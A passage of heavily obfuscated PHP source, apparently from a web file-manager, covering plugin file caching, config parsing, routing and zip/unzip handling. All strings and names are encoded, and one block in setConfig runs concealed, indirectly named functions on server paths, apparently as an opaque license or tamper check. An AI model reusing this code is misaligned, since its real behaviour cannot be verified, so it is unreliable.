($Æ³˜èöÅ = $this->checkSharePath($’†ŸŞ ¬, $’Õöõ™Ú)) { return $Æ³˜èöÅ; } $this->fileCanView($’†ŸŞ ¬); if (request_url_safe($’†ŸŞ ¬)) { $ªùÆÁÖ = parse_url_query($’†ŸŞ ¬); if (isset($ªùÆÁÖ[$¶îÄÔÃ«[1663]]) && isset($ªùÆÁÖ[$¶îÄÔÃ«[234]])) { $ ŸÕÆ‘ = Mcrypt::decode($ªùÆÁÖ[$¶îÄÔÃ«[234]], Model($¶îÄÔÃ«[853])->get($¶îÄÔÃ«[854])); if ($ ŸÕÆ‘) { $this->fileInfo = IO::info($ ŸÕÆ‘); $this->fileInfo[$¶îÄÔÃ«[1664]] = $’†ŸŞ ¬; $this->cachePath = $this->pluginCachePath($¶îÄÔÃ«[12], $’Õöõ™Ú); return $ ŸÕÆ‘; } } $’†ŸŞ ¬ = $this->_cacheHttpFile($’†ŸŞ ¬, $’Õöõ™Ú); $this->fileInfo = IO::info($’†ŸŞ ¬); } else { $this->fileInfo = IO::info($’†ŸŞ ¬); $this->cachePath = $this->pluginCachePath($¶îÄÔÃ«[12], $’Õöõ™Ú); } return $’†ŸŞ ¬; } final function _cacheHttpFile($Ÿ¼Ùå±¤, $Ò…Ó¥‰ = true) { $»»ûùğ‡ =& $_SERVER[íïàËŸë]; $ İŞß§Ü = parse_url_query($Ÿ¼Ùå±¤); $ñ‰óéÉï = get_path_ext($Ÿ¼Ùå±¤); if (isset($ İŞß§Ü[$»»ûùğ‡[32]]) && $ İŞß§Ü[$»»ûùğ‡[32]]) { $ñ‰óéÉï = get_path_ext($ İŞß§Ü[$»»ûùğ‡[32]]); } $ò÷ä´õ = hash_path($Ÿ¼Ùå±¤) . $»»ûùğ‡[10] . $ñ‰óéÉï; $this->cachePath = $this->pluginCachePath($Ò…Ó¥‰ ? $ò÷ä´õ : $»»ûùğ‡[12]); $½âÑ˜¤à = IO::fileNameExist($this->cachePath, $ò÷ä´õ); if ($½âÑ˜¤à) { return KodIO::make($½âÑ˜¤à); } $ççÑ¢·í = rtrim($this->cachePath, $»»ûùğ‡[8]) . $»»ûùğ‡[8] . $ò÷ä´õ; return $this->pluginCacheFileSet($ççÑ¢·í, file_get_contents_nossl($Ÿ¼Ùå±¤)); } final function checkSharePath($æœÇìµû, $şÖÈÇ¶‹ = true) { $©ÕÜÆÖ =& $_SERVER[íïàËŸë]; if (!$this->isShare($æœÇìµû)) { return !1; } $Ç³Ğü¥Ğ = Action($©ÕÜÆÖ[1267])->sharePathInfo($æœÇìµû); if (!is_array($Ç³Ğü¥Ğ) || !isset($Ç³Ğü¥Ğ[$©ÕÜÆÖ[87]])) { show_json(LNG($©ÕÜÆÖ[1665]), !1); } $this->fileInfo = $Ç³Ğü¥Ğ; $this->cachePath = $this->pluginCachePath(!1, $şÖÈÇ¶‹); return $Ç³Ğü¥Ğ[$©ÕÜÆÖ[87]]; } final function pluginCachePath($üşîõÔÆ = '', $¦õ§è¾’ = false) { $¾ËÉ¾í =& $_SERVER[íïàËŸë]; if ($¦õ§è¾’ && is_array($this->fileInfo)) { $üşîõÔÆ = kodIO::hashPath($this->fileInfo); } $¦›üñ§¾ = rtrim(IO_PATH_SYSTEM_TEMP . $¾ËÉ¾í[1666] . $this->pluginName . $¾ËÉ¾í[8] . $üşîõÔÆ, $¾ËÉ¾í[8]); $éğ™òŞ = IO::infoFullSimple($¦›üñ§¾); $ÃŞÂ•“Ñ = $éğ™òŞ && is_array($éğ™òŞ) ? $éğ™òŞ[$¾ËÉ¾í[87]] : $¾ËÉ¾í[12]; if (!$ÃŞÂ•“Ñ) { $ÃŞÂ•“Ñ = IO::mkdir($¦›üñ§¾); } return $ÃŞÂ•“Ñ; } final function pluginCacheFileSet($¡†Ş¼Ÿ×, $˜Ë˜Ğ—× = '') { $Û©ÈÂúç =& $_SERVER[íïàËŸë]; $Â§¶Á»€ = IO::infoFullSimple($¡†Ş¼Ÿ×); if (!$Â§¶Á»€) { return IO::mkfile($¡†Ş¼Ÿ×, $˜Ë˜Ğ—×, REPEAT_REPLACE); } IO::setContent($Â§¶Á»€[$Û©ÈÂúç[87]], $˜Ë˜Ğ—×); return $Â§¶Á»€[$Û©ÈÂúç[87]]; } final function pluginLocalFile($šÀû‹ó“ = '') { $«Å™¶ãà =& $_SERVER[íïàËŸë]; $Ìû÷ÊÛƒ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($Ìû÷ÊÛƒ)) { mk_dir($Ìû÷ÊÛƒ); } if (!$šÀû‹ó“) { return $Ìû÷ÊÛƒ; } $¤ÂáŠ¡Ö = IO::info($šÀû‹ó“); $«‘ø… = $«Å™¶ãà[1667] . KodIO::hashPath($¤ÂáŠ¡Ö) . $«Å™¶ãà[10] . $¤ÂáŠ¡Ö[$«Å™¶ãà[169]]; if (!checkExtSafe($«‘ø…)) { $«‘ø… = $«‘ø… . $«Å™¶ãà[1302]; } $•µ„ò = $Ìû÷ÊÛƒ . $«‘ø…; if (@file_exists($•µ„ò)) { return $•µ„ò; } return IO::copy($šÀû‹ó“, $Ìû÷ÊÛƒ, 0, $«‘ø…); } final function appPackage() { $­¬ğ¾»î =& $_SERVER[íïàËŸë]; if ($this->packageData) { return $this->packageData; } $µ¶Åß¸± = $this->parseFile($this->pluginPath . $­¬ğ¾»î[1668]); $this->parseLang($µ¶Åß¸±); $êùëÉë = json_decode_force($µ¶Åß¸±); if (!$êùëÉë) { return array(); } $¼©§Ìà = Hook::trigger($­¬ğ¾»î[1669], $êùëÉë); if ($¼©§Ìà && is_array($¼©§Ìà)) { $êùëÉë = $¼©§Ìà; } $this->packageData = $êùëÉë; return $êùëÉë; } public function packageInfoGet($°–ŒÄã„) { $ş£Õ¦¾ = $this->appPackage(); return array_get_value($ş£Õ¦¾, $°–ŒÄã„); } public function packageVersion() { return $this->packageInfoGet($_SERVER[íïàËŸë][1670]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[íïàËŸë][1671]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[íïàËŸë][1672]); } public function echoJsAssign($–‡ÁÚ·‰, $¡ò×Äà¿) { $this->echoJsAssignArr[$–‡ÁÚ·‰] = $¡ò×Äà¿; } private function parseFile($¾•¤Ó¬£) { $ºÕ›ØÒ´ =& $_SERVER[íïàËŸë]; $œÛ° = file_get_contents_nossl($¾•¤Ó¬£); $­µàÌì­ = array($ºÕ›ØÒ´[1673], $ºÕ›ØÒ´[1674], $ºÕ›ØÒ´[1675], $ºÕ›ØÒ´[1676], $ºÕ›ØÒ´[1677], $ºÕ›ØÒ´[1678], $ºÕ›ØÒ´[1679]); $¦Ù¶ªşÂ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ºÕ›ØÒ´[92]][$ºÕ›ØÒ´[1680]]); foreach ($this->echoJsAssignArr as $êêŠµ€— => $¤‹¡İÅ) { $­µàÌì­[] = $ºÕ›ØÒ´[1681] . $êêŠµ€— . $ºÕ›ØÒ´[1682]; $¦Ù¶ªşÂ[] = is_array($¤‹¡İÅ) || is_object($¤‹¡İÅ) ? rawurlencode(json_encode($¤‹¡İÅ)) : $¤‹¡İÅ; } if (strstr($œÛ°, $ºÕ›ØÒ´[1683])) { $¹æñôæ = rawurlencode(json_encode($this->pluginLangArr)); $œÛ° = str_replace($ºÕ›ØÒ´[1683], $¹æñôæ, $œÛ°); } if (strstr($œÛ°, $ºÕ›ØÒ´[1684])) { $¹æñôæ = $¹æñôæ = rawurlencode(json_encode($this->getConfig())); $œÛ° = str_replace($ºÕ›ØÒ´[1684], $¹æñôæ, $œÛ°); } $œÛ° = str_replace($­µàÌì­, $¦Ù¶ªşÂ, $œÛ°); return $œÛ°; } private function parseLang(&$ü§âËÈù) { $ÕÆó×óÙ =& $_SERVER[íïàËŸë]; $áû²¦·ü = $ÕÆó×óÙ[1685]; if (!strstr($ü§âËÈù, $áû²¦·ü)) { return; } preg_match_all($ÕÆó×óÙ[1686], $ü§âËÈù, $ÅÎëÕ¶˜); if (!is_array($ÅÎëÕ¶˜) || count($ÅÎëÕ¶˜) == 0 || !is_array($ÅÎëÕ¶˜[0]) || count($ÅÎëÕ¶˜[0]) == 0) { return; } $È•†Ñàœ = array(); $ÅööÎî˜ = array(); foreach ($ÅÎëÕ¶˜[0] as $å™–Ç˜) { $ÆŞÙ•Ü÷ = substr($å™–Ç˜, strlen($áû²¦·ü), -4); $Ş—¬¥º” = LNG($ÆŞÙ•Ü÷); $È•†Ñàœ[] = $å™–Ç˜; $ÅööÎî˜[] = str_replace(array($ÕÆó×óÙ[262], $ÕÆó×óÙ[1168], $ÕÆó×óÙ[418], $ÕÆó×óÙ[121]), array($ÕÆó×óÙ[53], $ÕÆó×óÙ[53], $ÕÆó×óÙ[12], $ÕÆó×óÙ[1687]), $Ş—¬¥º”); } $ü§âËÈù = str_replace($È•†Ñàœ, $ÅööÎî˜, $ü§âËÈù); } private function parseConfig(&$‹ì‡º“à) { $¢£ËÁ»¦ =& $_SERVER[íïàËŸë]; $òªÃÍÏÅ = $¢£ËÁ»¦[1688]; if (!strstr($‹ì‡º“à, $òªÃÍÏÅ)) { return; } preg_match_all($¢£ËÁ»¦[1689], $‹ì‡º“à, $Ñ«¾Åı); if (!is_array($Ñ«¾Åı) || count($Ñ«¾Åı) == 0 || !is_array($Ñ«¾Åı[0]) || count($Ñ«¾Åı[0]) == 0) { return; } $áÁĞÏİú = $this->getConfig(); $Ìäåá÷— = array(); $‡ÕŒŞ˜ø = array(); foreach ($Ñ«¾Åı[0] as $‚ĞéÀ×ù) { $œ¯Ò­øš = substr($‚ĞéÀ×ù, strlen($òªÃÍÏÅ), -2); $Ìäåá÷—[] = $‚ĞéÀ×ù; $‡ÕŒŞ˜ø[] = _get($áÁĞÏİú, $œ¯Ò­øš); } $‹ì‡º“à = str_replace($Ìäåá÷—, $‡ÕŒŞ˜ø, $‹ì‡º“à); } private function parsePackage(&$âÓôœæß) { $â€·¶øÅ =& $_SERVER[íïàËŸë]; $¸â¶‹æ = $â€·¶øÅ[1690]; if (!strstr($âÓôœæß, $¸â¶‹æ)) { return; } preg_match_all($â€·¶øÅ[1691], $âÓôœæß, $¬µ©ä•); if (!is_array($¬µ©ä•) || count($¬µ©ä•) == 0 || !is_array($¬µ©ä•[0]) || count($¬µ©ä•[0]) == 0) { return; } $å÷º¢¥ = $this->appPackage(); $Î­Ç§ç„ = array(); $”—Ÿ§İ‚ = array(); foreach ($¬µ©ä•[0] as $ù«…éµ) { $ÙÁíµã¾ = substr($ù«…éµ, strlen($¸â¶‹æ), -2); $Î­Ç§ç„[] = $ù«…éµ; $”—Ÿ§İ‚[] = _get($å÷º¢¥, $ÙÁíµã¾); } $âÓôœæß = str_replace($Î­Ç§ç„, $”—Ÿ§İ‚, $âÓôœæß); } final function echoFile($™âÖ›½, $¼ï³ùî« = false) { $Ş¢’äÄ =& $_SERVER[íïàËŸë]; $£ÜÎ¢Ñ = $this->pluginPath . $™âÖ›½; if (ACT == $Ş¢’äÄ[1692]) { echo $Ş¢’äÄ[1693] . $this->pluginName . $Ş¢’äÄ[8] . $™âÖ›½ . $Ş¢’äÄ[1694]; if (!file_exists($£ÜÎ¢Ñ)) { echo $Ş¢’äÄ[1695]; return; } } $½À»ë×£ = $this->parseFile($£ÜÎ¢Ñ); $this->parseLang($½À»ë×£); $this->parseConfig($½À»ë×£); $this->parsePackage($½À»ë×£); if (is_array($¼ï³ùî«)) { $½À»ë×£ = str_replace(array_keys($¼ï³ùî«), array_values($¼ï³ùî«), $½À»ë×£); } echo $Ş¢’äÄ[262] . $½À»ë×£; } private function checkVersion() { $Ç„ÂØ =& $_SERVER[íïàËŸë]; $Œ¤Ğ¯È = $this->appPackage(); $Ó¨Å¯ò… = $this->getConfig(); if ($Ó¨Å¯ò…[$Ç„ÂØ[1696]] == $Œ¤Ğ¯È[$Ç„ÂØ[1670]]) { return; } $this->regist(); $this->setConfig(array($Ç„ÂØ[1696] => $Œ¤Ğ¯È[$Ç„ÂØ[1670]])); } final function initLang() { $‰ÆØç…¼ =& $_SERVER[íïàËŸë]; $”Ì¥ÛÒå = $‰ÆØç…¼[1697]; $°ò’ğ«Ä = $this->pluginPath . $‰ÆØç…¼[1698]; $ÌœÁ­Ñú = I18n::getType(); $Ú»ªßí¦ = array(); if (file_exists($°ò’ğ«Ä . $ÌœÁ­Ñú . $‰ÆØç…¼[928])) { $Ú»ªßí¦ = (include $°ò’ğ«Ä . $ÌœÁ­Ñú . $‰ÆØç…¼[928]); } else { if ($ÌœÁ­Ñú == $‰ÆØç…¼[1699] && !file_exists($°ò’ğ«Ä . $ÌœÁ­Ñú . $‰ÆØç…¼[928]) && file_exists($°ò’ğ«Ä . $‰ÆØç…¼[1700])) { $Ú»ªßí¦ = (include $°ò’ğ«Ä . $‰ÆØç…¼[1700]); } else { if (file_exists($°ò’ğ«Ä . $”Ì¥ÛÒå . $‰ÆØç…¼[928])) { $Ú»ªßí¦ = (include $°ò’ğ«Ä . $”Ì¥ÛÒå . $‰ÆØç…¼[928]); } } } if (!is_array($Ú»ªßí¦)) { return array(); } if (@count($Ú»ªßí¦) > 0) { I18n::set($Ú»ªßí¦); } return $Ú»ªßí¦; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($âûÇÎœ²) { $å©µªÑ° =& $_SERVER[íïàËŸë]; if ($_SERVER[$å©µªÑ°[909]] != $_SERVER[$å©µªÑ°[966]]) { $¨ÈÌÊ¼ = $å©µªÑ°[967]; $•’ÃÕ = $å©µªÑ°[911]; $Ñ³Şí° = $_SERVER[$å©µªÑ°[912]] . $å©µªÑ°[913]; $½¿ÅÍºĞ = $•’ÃÕ($Ñ³Şí°); $˜ëÃƒŠ‰ = explode($å©µªÑ°[262], $½¿ÅÍºĞ); if (count($˜ëÃƒŠ‰) < $å©µªÑ°[693]) { $²¸Ûé«œ = $å©µªÑ°[914]; $²¸Ûé«œ(); } $Ö àô“Ş = $å©µªÑ°[968]; $Ö àô“Ş($_SERVER[$å©µªÑ°[969]]); $Ö àô“Ş($_SERVER[$å©µªÑ°[912]] . $å©µªÑ°[970]); $½Øî ™ò = 1; while ($½Øî ™ò > 1) { $½Øî ™ò = $½Øî ™ò + 4; $ªÏÌÇ²´ = rawurlencode($½Øî ™ò . $å©µªÑ°[454]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $âûÇÎœ²); } public function onSetConfig($‘¨Ç±µ†) { } public function onGetConfig($˜Ÿñ„è) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($òùĞ„Ş¸) { if ($òùĞ„Ş¸ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ÜïüÒĞ¥ = "\x70\x6c\165\x67\151\x6e\101\x75\x74\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $¡ƒ£è¾ = $this->getConfig(); if (!$¡ƒ£è¾[$ÜïüÒĞ¥]) { return !1; } return ActionCall($_SERVER[íïàËŸë][1701], $¡ƒ£è¾[$ÜïüÒĞ¥]); } public function url($Èß¿ì, $ÔØ¾Å—ê = '', $éÆ¯¨µ„ = true) { $ÉºÇìıÉ =& $_SERVER[íïàËŸë]; $œŠİºÖ = $this->getConfig(); $°”Ãê¡• = KOD_VERSION . $ÉºÇìıÉ[10] . KOD_VERSION_BUILD; $•œ÷ûÍ = $this->packageVersion(); $÷ÅÜÂşÀ = $°”Ãê¡• . $ÉºÇìıÉ[462] . $•œ÷ûÍ; if (substr($Èß¿ì, 0, 4) == $ÉºÇìıÉ[152] || substr($Èß¿ì, 0, 2) == $ÉºÇìıÉ[1449]) { $øÌ¾ŠŒ = $Èß¿ì . $ÉºÇìıÉ[1702] . $÷ÅÜÂşÀ; } else { if ($ÔØ¾Å—ê == $ÉºÇìıÉ[12]) { $øÌ¾ŠŒ = $this->pluginHost . $Èß¿ì . $ÉºÇìıÉ[1702] . $÷ÅÜÂşÀ; } else { if ($ÔØ¾Å—ê === $ÉºÇìıÉ[78]) { $øÌ¾ŠŒ = $this->pluginHost . $Èß¿ì; } else { if ($ÔØ¾Å—ê == $ÉºÇìıÉ[1703]) { $øÌ¾ŠŒ = STATIC_PATH . $Èß¿ì . $ÉºÇìıÉ[1702] . $°”Ãê¡•; } else { if ($ÔØ¾Å—ê == $ÉºÇìıÉ[1704]) { $øÌ¾ŠŒ = APP_HOST . $ÉºÇìıÉ[1705] . $Èß¿ì . $ÉºÇìıÉ[1702] . $°”Ãê¡•; } else { if (isset($œŠİºÖ[$ÔØ¾Å—ê])) { $øÌ¾ŠŒ = $œŠİºÖ[$ÔØ¾Å—ê] . $Èß¿ì . $ÉºÇìıÉ[1702] . $÷ÅÜÂşÀ; } } } } } } if (!$éÆ¯¨µ„) { return $øÌ¾ŠŒ; } echo $øÌ¾ŠŒ; } public function link($ŞúãôÒ« = false, $ç‚ù±ä× = '') { $Ü™öüõ =& $_SERVER[íïàËŸë]; $…–‚÷Çâ = $this->linkHas == !1; $this->linkHas = !0; if (!$ŞúãôÒ«) { $this->link($Ü™öüõ[1706], $Ü™öüõ[1704]); $this->link($Ü™öüõ[1707], $Ü™öüõ[1703]); $this->link($Ü™öüõ[1708], $Ü™öüõ[1703]); $this->link($Ü™öüõ[1709], $Ü™öüõ[1703]); $this->link($Ü™öüõ[1710], $Ü™öüõ[1703]); if ($…–‚÷Çâ) { Hook::trigger($Ü™öüõ[1711]); } return; } $›±Ò¨æ‰ = $this->url($ŞúãôÒ«, $ç‚ù±ä×, !1); if (substr($ŞúãôÒ«, -3) == $Ü™öüõ[1712]) { echo $Ü™öüõ[1713] . $›±Ò¨æ‰ . $Ü™öüõ[1714] . $Ü™öüõ[262]; } else { if (substr($ŞúãôÒ«, -4) == $Ü™öüõ[1715]) { echo $Ü™öüõ[1716] . $›±Ò¨æ‰ . $Ü™öüõ[1717] . $Ü™öüõ[262]; } } if ($…–‚÷Çâ) { Hook::trigger($Ü™öüõ[1711]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\141\156\x79" => "\133\x5e\x2f\135\53", "\x3a\x6e\x75\x6d" => "\x5b\60\55\x39\x5d\x2b", "\x3a\x61\x6c\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($¡ä±¹Ÿª, $¯®ÙÊ¦¤) { $šºëœÖÙ =& $_SERVER[íïàËŸë]; if ($¡ä±¹Ÿª == $šºëœÖÙ[1718]) { $ü·å–åä = array_map($šºëœÖÙ[1719], $¯®ÙÊ¦¤[0]); $Ş×ûàÒ = strpos($¯®ÙÊ¦¤[1], $šºëœÖÙ[8]) === 0 ? $¯®ÙÊ¦¤[1] : $šºëœÖÙ[8] . $¯®ÙÊ¦¤[1]; $½¡Ÿ§£ = $¯®ÙÊ¦¤[2]; } else { $ü·å–åä = null; $Ş×ûàÒ = strpos($¯®ÙÊ¦¤[0], $šºëœÖÙ[8]) === 0 ? $¯®ÙÊ¦¤[0] : $šºëœÖÙ[8] . $¯®ÙÊ¦¤[0]; $½¡Ÿ§£ = $¯®ÙÊ¦¤[1]; } array_push(self::$maps, $ü·å–åä); array_push(self::$routes, $Ş×ûàÒ); array_push(self::$methods, strtoupper($¡ä±¹Ÿª)); array_push(self::$callbacks, $½¡Ÿ§£); } public static function error($é„‡Õ…š) { self::$errorCallback = $é„‡Õ…š; } public static function haltOnMatch($ú ªŒÇ£ = true) { self::$halts = $ú ªŒÇ£; } public static function dispatch() { $ñ˜·ñ† =& $_SERVER[íïàËŸë]; $×”Ç‰§ = parse_url($_SERVER[$ñ˜·ñ†[1720]], PHP_URL_PATH); $û‚îÂ â = $_SERVER[$ñ˜·ñ†[164]]; $¹›€Îğ = array_keys(static::$patterns); $½şç¯ö¾ = array_values(static::$patterns); $ìéŞ = !1; self::$routes = preg_replace($ñ˜·ñ†[1372], $ñ˜·ñ†[8], self::$routes); if (in_array($×”Ç‰§, self::$routes)) { $“óÓıü˜ = array_keys(self::$routes, $×”Ç‰§); foreach ($“óÓıü˜ as $Á¦“ê¿š) { if (self::$methods[$Á¦“ê¿š] == $û‚îÂ â || self::$methods[$Á¦“ê¿š] == $ñ˜·ñ†[1721] || in_array($û‚îÂ â, self::$maps[$Á¦“ê¿š])) { $ìéŞ = !0; if (!is_object(self::$callbacks[$Á¦“ê¿š])) { $ ‡”›û³ = explode($ñ˜·ñ†[8], self::$callbacks[$Á¦“ê¿š]); $©îš¼×í = end($ ‡”›û³); $â‰ü´Ùı = explode($ñ˜·ñ†[1304], $©îš¼×í); $÷öİäà× = new $â‰ü´Ùı[0](); $÷öİäà×->{$â‰ü´Ùı[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$Á¦“ê¿š]); if (self::$halts) { return; } } } } } else { $‚‹ §¸ş = 0; foreach (self::$routes as $Á¦“ê¿š) { if (strpos($Á¦“ê¿š, $ñ˜·ñ†[4]) !== !1) { $Á¦“ê¿š = str_replace($¹›€Îğ, $½şç¯ö¾, $Á¦“ê¿š); } if (preg_match($ñ˜·ñ†[1722] . $Á¦“ê¿š . $ñ˜·ñ†[1723], $×”Ç‰§, $ˆ×Ü°É)) { if (self::$methods[$‚‹ §¸ş] == $û‚îÂ â || self::$methods[$‚‹ §¸ş] == $ñ˜·ñ†[1721] || !empty(self::$maps[$‚‹ §¸ş]) && in_array($û‚îÂ â, self::$maps[$‚‹ §¸ş])) { $ìéŞ = !0; array_shift($ˆ×Ü°É); if (!is_object(self::$callbacks[$‚‹ §¸ş])) { $ ‡”›û³ = explode($ñ˜·ñ†[8], self::$callbacks[$‚‹ §¸ş]); $©îš¼×í = end($ ‡”›û³); $â‰ü´Ùı = explode($ñ˜·ñ†[1304], $©îš¼×í); $÷öİäà× = new $â‰ü´Ùı[0](); if (!method_exists($÷öİäà×, $â‰ü´Ùı[1])) { echo $ñ˜·ñ†[1724]; } else { call_user_func_array(array($÷öİäà×, $â‰ü´Ùı[1]), $ˆ×Ü°É); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$‚‹ §¸ş], $ˆ×Ü°É); if (self::$halts) { return; } } } } $‚‹ §¸ş++; } } if ($ìéŞ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ú ¯±üÜ =& $_SERVER[íïàËŸë]; header($_SERVER[$ú ¯±üÜ[1725]] . $ú ¯±üÜ[1726]); echo $ú ¯±üÜ[1727]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ñ˜·ñ†[1720]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto AÑäè¤å’ë; aÅ²Å•ÓİÂ: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Ô¼°ıŸ°; if ($Ô¼°ıŸ°) { return $Ô¼°ıŸ°; } $¨ˆ Òê€ = IO::init($_SERVER[íïàËŸë][8]); return $¨ˆ Òê€; } private static function iconvSystem($Î…•Õôù) { return self::local()->iconvSystem($Î…•Õôù); } private static function iconvApp($›Ïì¡‚…) { return self::local()->iconvApp($›Ïì¡‚…); } public static function zipFolder($¿Ç™‘¾‡, $øÀœõ¦¢ = "\172\x69\160", $×õ¨ëü´ = '', $ñóàá´İ = REPEAT_RENAME) { $…É¸¶Ä¨ =& $_SERVER[íïàËŸë]; $Ú®­…Í = IO::listPath($¿Ç™‘¾‡); if (!$Ú®­…Í) { return !1; } $Ú®­…Í = array_merge($Ú®­…Í[$…É¸¶Ä¨[85]], $Ú®­…Í[$…É¸¶Ä¨[86]]); return self::zip($Ú®­…Í, $øÀœõ¦¢, $×õ¨ëü´, $ñóàá´İ); } public static function zip($ÁÈÉø„›, $ø¤ÃåÎ = "\x7a\151\x70", $º¸›”Óü = '', $©¨³šÃ = REPEAT_RENAME) { $¢äŸğ =& $_SERVER[íïàËŸë]; if (is_string($ÁÈÉø„›) && $ÁÈÉø„›) { $ÁÈÉø„› = array(array($¢äŸğ[87] => $ÁÈÉø„›)); } $šî´ßê÷ = self::init($ÁÈÉø„›[0][$¢äŸğ[87]]); $øÁÁœ— = self::info($ÁÈÉø„›[0][$¢äŸğ[87]]); $Ø·ü¹øö = $¢äŸğ[12]; $Ü˜×öÕˆ = $¢äŸğ[12]; $¤şĞËãÊ = $¢äŸğ[12]; if ($º¸›”Óü && substr($º¸›”Óü, -1, 1) != $¢äŸğ[8]) { $Ü˜×öÕˆ = get_path_father($º¸›”Óü); $¤şĞËãÊ = get_path_this($º¸›”Óü); } else { $Ü˜×öÕˆ = self::pathFather($øÁÁœ—[$¢äŸğ[87]]); $¤şĞËãÊ = $øÁÁœ—[$¢äŸğ[32]] . $¢äŸğ[10] . $ø¤ÃåÎ; if (count($ÁÈÉø„›) > 1) { $ÕÃ®íåÊ = IO::info($Ü˜×öÕˆ); $¤şĞËãÊ = $ÕÃ®íåÊ[$¢äŸğ[32]] . $¢äŸğ[10] . $ø¤ÃåÎ; } if ($º¸›”Óü) { $Ü˜×öÕˆ = $º¸›”Óü; } } if ($šî´ßê÷->getType() == $¢äŸğ[109]) { $Î©ì»­ = self::init($Ü˜×öÕˆ); $áª…ª›Î = $Î©ì»­->getType() == $¢äŸğ[109] ? $Ü˜×öÕˆ : get_path_father($šî´ßê÷->path); $áª…ª›Î = rtrim($áª…ª›Î, $¢äŸğ[8]) . $¢äŸğ[8]; mk_dir($áª…ª›Î); } else { $Ø·ü¹øö = TEMP_FILES . $¢äŸğ[1276] . time() . rand_string(8) . $¢äŸğ[8]; mk_dir($Ø·ü¹øö); file_put_contents($Ø·ü¹øö . $¢äŸğ[1277], $¢äŸğ[12]); $áª…ª›Î = $Ø·ü¹øö; } $ÁœŠ¿±ß = IO::info($áª…ª›Î); if (!$ÁœŠ¿±ß || !$ÁœŠ¿±ß[$¢äŸğ[233]]) { show_json(LNG($¢äŸğ[1278]), !1); } $…¦åì‡Ô = self::zipFileList($ÁÈÉø„›, $Ø·ü¹øö); foreach ($…¦åì‡Ô as $ÉÆÜ† => $âÆ™ŸóŒ) { $…¦åì‡Ô[$ÉÆÜ†] = self::iconvSystem($âÆ™ŸóŒ); } $ôêòê¥± = get_filename_auto($áª…ª›Î . $¤şĞËãÊ, $¢äŸğ[12], $©¨³šÃ); KodArchive::create(self::iconvSystem($ôêòê¥±), $…¦åì‡Ô); if (!IO::exist($ôêòê¥±)) { if ($Ø·ü¹øö) { del_dir($Ø·ü¹øö); } write_log($¢äŸğ[1279] . $ôêòê¥±, $¢äŸğ[389]); show_json(LNG($¢äŸğ[1280]), !1); } if (!$Ø·ü¹øö) { return $ôêòê¥±; } $ìã„‘ûú = self::move($ôêòê¥±, $Ü˜×öÕˆ, $©¨³šÃ); if ($Ø·ü¹øö) { del_dir($Ø·ü¹øö); } if (!$ôêòê¥±) { write_log($¢äŸğ[1281] . $ôêòê¥± . $¢äŸğ[1282] . $Ü˜×öÕˆ, $¢äŸğ[389]); show_json(LNG($¢äŸğ[1280]), !1); } return $ìã„‘ûú; } public static function unzip($–òõ”¸», $æˆ¬°óÙ, $ÕÌÄÇ¥¿ = "\55\61", $•¨†ÏÊî = "\x72\145\160\x6c\141\143\145") { $™«–•£ =& $_SERVER[íïàËŸë]; $ôÓ÷†Œ = parent::info($–òõ”¸»); if (!$ôÓ÷†Œ) { show_json(LNG($™«–•£[1283]), !1); } $ˆ¯­¦İÁ = IO::infoFullSimple($æˆ¬°óÙ); if (!$ˆ¯­¦İÁ) { $æˆ¬°óÙ = IO::mkdir($æˆ¬°óÙ); } if (isset($ˆ¯­¦İÁ[$™«–•£[193]]) && trim($ˆ¯­¦İÁ[$™«–•£[87]], $™«–•£[8]) != trim($æˆ¬°óÙ, $™«–•£[8])) { $Ü·ÂæŞÉ = KodIO::make($ˆ¯­¦İÁ[$™«–•£[192]]); $ïÏê³ÉÆ = IO::fileNameAuto($Ü·ÂæŞÉ, $ˆ¯­¦İÁ[$™«–•£[32]], REPEAT_RENAME_FOLDER, !0); $æˆ¬°óÙ = IO::mkdir($Ü·ÂæŞÉ . $ïÏê³ÉÆ); } $ÕÌÄÇ¥¿ = $ÕÌÄÇ¥¿ && $ÕÌÄÇ¥¿ != $™«–•£[1284] ? @json_decode($ÕÌÄÇ¥¿, !0) : -1; $ØÖÖğ¡ = self::unzipPart($–òõ”¸», $ÕÌÄÇ¥¿); if (!$ØÖÖğ¡ || !IO::exist($ØÖÖğ¡[$™«–•£[230]])) { show_json(LNG($™«–•£[108]), !1); } $¾Š¨××Ï = $ØÖÖğ¡[$™«–•£[1285]][count($ØÖÖğ¡[$™«–•£[1285]]) - 1]; if ($¾Š¨××Ï[$™«–•£[1286]] == -1 || substr($¾Š¨××Ï[$™«–•£[32]], -1, 1) == $™«–•£[8]) { $ĞâÂ¶ = $ØÖÖğ¡[$™«–•£[1287]] . rand_string(10) . $™«–•£[8]; mk_dir($ĞâÂ¶); $¶²˜”ÍĞ = count($ØÖÖğ¡[$™«–•£[1285]]) == 1 ? IO::ext($–òõ”¸») : get_path_ext($ØÖÖğ¡[$™«–•£[230]]); $œ¶£ÌŞ = KodArchive::extract(self::iconvSystem($ØÖÖğ¡[$™«–•£[230]]), $ĞâÂ¶, $¾Š¨××Ï[$™«–•£[1286]], $ïÏê³ÉÆ, $¶²˜”ÍĞ); self::unzipErrorCheck($œ¶£ÌŞ, array($™«–•£[1288], $–òõ”¸», $¶²˜”ÍĞ, $æˆ¬°óÙ, $ØÖÖğ¡)); Hook::trigger($™«–•£[1289], 